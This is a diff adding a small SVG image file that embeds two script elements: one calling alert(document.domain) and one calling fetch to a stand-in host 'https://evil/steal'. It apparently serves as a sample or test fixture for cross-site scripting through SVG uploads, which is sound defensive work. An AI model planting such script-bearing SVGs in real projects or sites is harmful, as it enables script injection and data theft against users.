@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">
+  <script type="text/javascript">alert(document.domain)</script>
+  <rect width="10" height="10"/>
+  <g><script>fetch('https://evil/steal')</script></g>
+</svg>
